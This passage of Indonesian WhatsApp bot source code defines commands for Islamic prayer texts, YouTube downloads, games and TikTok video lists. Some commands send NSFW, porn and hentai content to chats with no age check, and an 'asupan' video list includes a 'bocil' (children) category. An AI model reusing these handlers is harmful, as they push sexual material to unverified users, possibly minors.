        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    Reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

//===============================================================================

case 'bacaansholat': {
let tks = `- Bacaan Iftitah
- Bacaan Al Fatihah
- Bacaan Ruku
- Bacaan Sujud
- Bacaan Duduk Diantara Dua Sujud
- Bacaan Duduk Tasyahud Awal
- Bacaan Duduk Tasyahud Akhir
- Bacaan Salam`
let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: tks
}),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: `© ${namaOwner}` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
  {
	"name": "single_select",
	"buttonParamsJson": `{
	"title": "Select Bacaan",
	"sections": [
	{
	"title": "Bot WhatsApp By ${namaOwner}",
    "highlight_label": "The Best",
	"rows": [
	{
	"title": "✨ Donasi",
	"description": "<!> Select For Donate",
	"id": ".donasi"
	}
	]},
	    {
        "title": "Select the menu you need at ${botname}", 
        "rows": [
	{
    "title": "Bacaan Inftitah",
    "description": "<!> Bacaan Sholat : Iftitah",
    "id": "${prefix}bacaan iftitah"
    },
    {
	"title": "Bacaan Al Fatihah",
	"description": "<!> Bacaan Sholat : Al Fatihah",
	"id": "${prefix}bacaan alfatihah"
	},
	{
	"title": "Bacaan Ruku",
	"description": "<!> Bacaan Sholat : Ruku",
	"id": "${prefix}bacaan ruku"
	},
	{
	"title": "Bacaan Sujud",
	"description": "<!> Bacaan Sholat : Sujud",
	"id": "${prefix}bacaan sujud"
	},
    {
	"title": "Bacaan Duduk Diantara Dua Sujud",
	"description": "<!> Bacaan Sholat : Duduk Diantara Dua Sujud",
	"id": "${prefix}bacaan diantaraduasujud"
    },
	{
	"title": "Bacaan Tasyahud Awal",
	"description": "<!> Bacaan Sholat : Tasyahud Awal",
	"id": "${prefix}bacaan tasyahudawal"
	},
	{
	"title": "Bacaan Tasyahud Akhir",
	"description": "<!> Bacaan Sholat : Tasyahud Akhir",
	"id": "${prefix}bacaan tasyahudakhir"
    },
    {
	"title": "Bacaan Salam",
	"description": "<!> Bacaan Sholat : Salam",
	"id": "${prefix}bacaan salam"
    }
]
}]
}`
},
],
}),
contextInfo: {
mentionedJid: [m.sender,global.owner+"@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
serverMessageId: null,
newsletterName: global.namaSaluran,
},
}
})
}
}
}, { quoted: qlocJpm })
await Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break

case 'bacaan': {
if (args[0] === 'iftitah') {
Reply(`Bacaan Iftitah

Arab : اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ

Latin : Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin

Terjemah : Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri`)
} else if (args[0] === 'alfatihah') {
Reply(`Al Fatihah

Arab : بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧

Latin : 1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin

Terjemah : 1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat`)
} else if (args[0] === 'ruku') {
Reply(`Bacaan Ruku

Arab : (3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ

Latin : Subhana Rabbiyal Adzimi Wabihamdih (3x)

Terjemah : Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya`)
} else if (args[0] === 'sujud') {
Reply(`Bacaan Sujud

Arab : (3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ

Latin : Subhaana robbiyal a'la wabihamdih (3x)

Terjemah : Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya`)
} else if (args[0] === 'diantaraduasujud') {
Reply(`Bacaan Duduk Diantara Dua Sujud

Arab : رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ

Latin : Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii

Terjemah : Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku`)
} else if (args[0] === 'tasyahudawal') {
Reply(`Duduk Tasyahud Awal

Arab : اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ

Latin : Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad

Terhemah : Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad`)
} else if (args[0] === 'tasyahudakhir') {
Reply(`Duduk Tasyahud Akhir

Arab : اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ

Latin : Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid

Terjemah : Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung`)
} else if (args[0] === 'salam') {
Reply(`Salam

Arab : اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ

Latin : Assalamualaikum Warohmatullahi Wabarokatuh

Terhemah : Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian.`)
}
}
break

//===============================================================================

case 'ayatkursi': {
let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
Reply(caption)
}
break

//===============================================================================

case 'kisahnabi': {
     if (!text) return m.reply(example(`adam`))
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return m.reply("*Not Found*\n*Tips:* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*\`[ K I S A H ] :\`*

${kisah.description}`
Reply(`${hasil}`)
}
break

//===============================================================================

case 'namaninja': { 
if (!text) return m.reply(example('Andika'))
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
let hasil = teks.replace(/[a-z]/gi, v => {
return {
'a': 'ka',
'b': 'tu',
'c': 'mi',
'd': 'te',
'e': 'ku',
'f': 'lu',
'g': 'ji',
'h': 'ri',
'i': 'ki',
'j': 'zu',
'k': 'me',
'l': 'ta',
'm': 'rin',
'n': 'to',
'o': 'mo',
'p': 'no',
'q': 'ke',
'r': 'shi',
's': 'ari',
't': 'ci',
'u': 'do',
'v': 'ru',
'w': 'mei',
'x': 'na',
'y': 'fu',
'z': 'zi'
}[v.toLowerCase()] || v
})
Reply(`*Nama Ninjamu:*
${capital(hasil)}`)
}
break

//===============================================================================

case 'neko': case 'nekopoi': {
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Sky.sendMessage(m.chat, {image: {url:waifudd.data.url},caption:`_Ah Sayang🥺_`},{ quoted: qlocJpm }).catch(err => {
 return('Error!')
})}
break

//===============================================================================

case 'pornhubvid': {
if (!text) return m.reply(example("Input query"))
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*\`[ RESULT ${index + 1} ]\`*
*࿂ Title :* ${item.title}
*࿂ Uploader :* ${item.uploader}
*࿂ Views :* ${item.views}
*࿂ Duration :* ${item.duration}
*࿂ Link :* ${item.link}
`
}).filter(v => v).join("\n")
await loading ()
await Reply(teks)
} catch (e) {
await m.reply(error)
}}
break

//===============================================================================

case 'hentaivid': {
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
await loading ()
Sky.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `*࿂ Title : ${cejd.title}*
࿂ Category : ${cejd.category}
࿂ Views : ${cejd.views_count}
࿂ Video Url : ${cejd.video_1}` }, { quoted: qlocJpm })
}

//===============================================================================

case 'cekkhodam': case 'cekkodam': {
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        name = args[0];
    }
    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    const khodam = [
  "Singa",
  "kosoong atau tidak ada",
  "Harimau",
  "Elang",
  "Serigala",
  "Naga",
  "Gajah",
  "Kuda",
  "Macan Tutul",
  "Kerbau",
  "Burung Hantu",
  "Burung Rajawali",
  "Ikan Hiu",
  "Lumba-Lumba",
  "Ular",
  "Kura-Kura",
  "Tupai",
  "Paus",
  "Kelelawar",
  "Kijang",
  "Banteng",
  "Rusa",
  "Anjing",
  "Kucing",
  "Buaya",
  "Kambing",
  "Kuda Nil",
  "Bebek",
  "Angsa",
  "Ayam",
  "Merpati",
  "Burung Beo",
  "Burung Kenari",
  "Burung Kakatua",
  "Bunglon",
  "Cicak",
  "Kodok",
  "Katak",
  "Tikus",
  "Landak",
  "Kanguru",
  "Koala",
  "Panda",
  "Beruang",
  "Rubah",
  "Lynx",
  "Leopard",
  "Jaguar",
  "Cheetah",
  "Badak",
  "Zebra",
  "Antelop",
  "Unta",
  "Alpaka",
  "Llama",
  "Serigala Abu-abu",
  "Serigala Merah",
  "Serigala Putih",
  "Lynx",
  "Harimau Putih",
  "Harimau Siberia",
  "Harimau Sumatra",
  "Gorila",
  "Orangutan",
  "Simpanse",
  "Monyet",
  "Babun",
  "Lemur",
  "Iguana",
  "Komodo",
  "Salamander",
  "Belut",
  "Sotong",
  "Gurita",
  "Kepiting",
  "Lobster",
  "Udang",
  "Kupu-kupu",
  "Lebah",
  "Tawon",
  "Kumbang",
  "Belalang",
  "Jangkrik",
  "Semut",
  "Kecoak",
  "Laba-laba",
  "Kalajengking",
  "Serangga Tongkat",
  "Naga Laut",
  "Kuda Laut",
  "Duyung",
  "Putri Duyung",
  "Burung Kolibri",
  "Burung Hantu Salju",
  "Burung Puyuh",
  "Burung Gagak",
  "Burung Pelikan",
  "Burung Albatros",
  "Burung Flamingo",
  "Burung Hering",
  "Burung Camar",
  "Burung Pinguin",
    "Cincin",
    "Batu Akik",
    "Keris",
    "Tongkat",
    "Pusaka",
    "Patung",
    "Mustika",
    "Tasbih",
    "Kalung",
    "Gelang",
    "Permata",
    "Pedang",
    "Mata Uang",
    "Wesi Kuning",
    "Serat Tali",
    "Belati",
    "Cundrik",
    "Selendang",
    "Jarum",
    "Tombak",
    "Kerikil",
    "Kendi",
    "Kain Kafan",
    "Topi",
    "Payung",
    "Sandal",
    "Kacamata",
    "Sabuk",
    "Sarung",
    "Tali Ikat Pinggang",
    "Surat",
    "Kunci",
    "Lilin",
    "Peniti",
    "Sisir",
    "Cermin",
    "Kendi Air",
    "Piring",
    "Gelas",
    "Mangkuk",
    "Sendok",
    "Sapu",
    "Gayung",
    "Tikar",
    "Bantal",
    "Guci",
    "Lentera",
    "Lampu",
    "Buku",
    "Pena",
    "Dupa",
    "Asbak",
    "Cangkir",
    "Gantungan Kunci",
    "Kalender",
    "Sepeda",
    "Lukisan",
    "Batu Kerikil",
    "Batu Kali",
    "Kipas",
    "Peci",
    "Sorban",
    "Rokok",
    "Topeng",
    "Gamelan",
    "Angklung",
    "Suling",
    "Wayang",
    "Kuda-Kudaan",
    "Sepatu",
    "Jam Tangan",
    "Mobil Remot",
    "Kosong atau tidak adaa"
];
const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
let text = `Khodam ${capital(name)} adalah ${randomKhodam}`;
await loading ()
await Reply(text)
}
break

//===============================================================================

case 'tiktokvids': case 'tiktokvid': case 'ttvids': case 'ttvid': case 'asupan': {
let teks = `*List Video TikTok*
* TikTok Girl
* TikTok Ghea
* TikTok Bocil
* TikTok Ukhty
* TikTok Santuy
* TikTok Kayes
* TikTok Panrika
* TikTok Notnot`
	let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: `© ${namaOwner}` }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
  {
	"name": "single_select",
	"buttonParamsJson": `{
	"title": "Select Video!",
	"sections": [{
	"title": "Select the menu you need at ${botname}",
	"rows": [{
	"title": "✨ Donasi",
	"description": "<!> Select For Donate",
	"id": ".donasi"
	},
	{
    "title": "🎞 Girl",
    "description": "<!> Select To See Video",
    "id": "${prefix}vidstiktokgirl"
    },
    {
	"title": "🎞 Ghea",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktokghea"
	},
	{
	"title": "🎞 Bocil",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktokbocil"
	},
	{
	"title": "🎞 Ukhty",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktokukhty"
	},
	{
	"title": "🎞 Santuy",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktoksantuy"
	},
	{
	"title": "🎞 Kayes",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktokkayes"
    },
    {
	"title": "🎞 Panrika",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktokpanrika"
    },
    {
	"title": "🎞 Notnot",
	"description": "<!> Select To See Video",
	"id": "${prefix}vidstiktoknotnot"
    }
]
}]
}`
},
],
}),
contextInfo: {
mentionedJid: [m.sender,global.owner+"@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
serverMessageId: null,
newsletterName: global.namaSaluran,
},
}
})
}
}
}, { quoted: qlocJpm })
await Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break
case 'vidstiktokgirl': {
await loading()
var asupan = JSON.parse(fs.readFileSync('./source/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktokghea': {
await loading()
var gheayubi = JSON.parse(fs.readFileSync('./source/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktokbocil': {
await loading()
var bocil = JSON.parse(fs.readFileSync('./source/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktoknukhty': {
await loading()
var ukhty = JSON.parse(fs.readFileSync('./source/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktoksantuy': {
await loading()
var santuy = JSON.parse(fs.readFileSync('./source/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktokkayes': {
await loading()
var kayes = JSON.parse(fs.readFileSync('./source/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktokpanrika': {
await loading()
var rikagusriani = JSON.parse(fs.readFileSync('./source/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break
case 'vidstiktoknotnot': {
await loading()
var notnot = JSON.parse(fs.readFileSync('./source/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Sky.sendMessage(m.chat, { caption: mess.done, video: { url: hasil.url }}, { quoted: m })
}
break

//===============================================================================

case 'menu': case 'listmenu': case 'menulist': case 'almenu': case 'menuall': case 'kats': {
await loading ()
Replymenu(`${botinfo}\n\n${userinfo}`)
}
break
case 'allmenu': case 'allkats': {
await loading ()
Replymenu(`${botinfo}

${userinfo}
${readmore}
${allmenu}`)}
break
case 'downloadmenu': case 'downloadkats': {
let teksnya = `${userinfo}

${downloadmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'funmenu': case 'funkats': {
let teksnya = `${userinfo}

${funmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'groupmenu': case 'groupkats': {
let teksnya = `${userinfo}

${groupmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'othermenu': case 'otherkats': {
let teksnya = `${userinfo}

${othermenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'ownermenu': case 'ownerkats': {
let teksnya = `${userinfo}

${ownermenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'panelmenu': case 'panelkats': {
let teksnya = `${userinfo}

${panelmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'searchmenu': case 'searchkats': {
let teksnya = `${userinfo}

${searchmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'toolsmenu': case 'toolskats': {
let teksnya = `${userinfo}

${toolsmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case '18menu': case '18kats': {
let teksnya = `${userinfo}

${xxxmenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'islammenu': case 'islamkats': {
let teksnya = `${userinfo}

${islammenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break
case 'gamemenu': case 'gamekats': {
let teksnya = `${userinfo}

${gamemenu}`
await loading ()
await Replymenu(`${teksnya}`)}
break

//===============================================================================

case "scriptkats": case "sc": case "script": {
Reply(`*Join my Whatsapp channel to get info and this Bot script*
- https://whatsapp.com/channel/0029Vav7vtlI7BeEQ5z7qH3c/140`)
}
break
//===============================================================================
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Sky.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================l
case "yts": {
if (!text) return m.reply(example('we dont talk'))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await sleep(1000)
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Sky.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await sleep(1000)
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Sky.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await sleep(1000)
